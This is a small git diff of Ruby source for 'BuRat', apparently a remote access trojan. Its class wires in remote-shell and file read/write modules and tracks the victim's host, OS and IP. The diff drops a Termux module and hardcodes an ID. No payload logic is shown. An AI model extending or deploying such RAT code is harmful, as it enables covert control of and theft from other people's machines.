@@ -10,13 +10,12 @@ require_relative 'internals/encryption'
 require_relative 'internals/serialization'
 require_relative 'bushido/filerw/bufilerw'
 require_relative 'bushido/remoteshell/buremoteshell'
-require_relative 'bushido/termux/butermux'
 
 class BuRat
   attr_reader :id, :host, :os, :ip, :stauts, :internals, :bushido
   def initialize(bushido = [])
     begin
-      @id = id()
+      @id = '8cba'
       @host = host()
       @os = os()
       @ip = :unknown
@@ -32,7 +31,6 @@ class BuRat
       @bushido = {}
       @bushido[:remoteshell] = Bushido::BuRemoteShell.new if bushido.include? :remoteshell
       @bushido[:filerw] = Bushido::BuFileReadWrite.new if bushido.include? :filerw
-      @bushido[:termux] = Bushido::BuTermux.new if bushido.include? :termux
       @cmd_topics = []
       @topics = {}
       @connect_thread
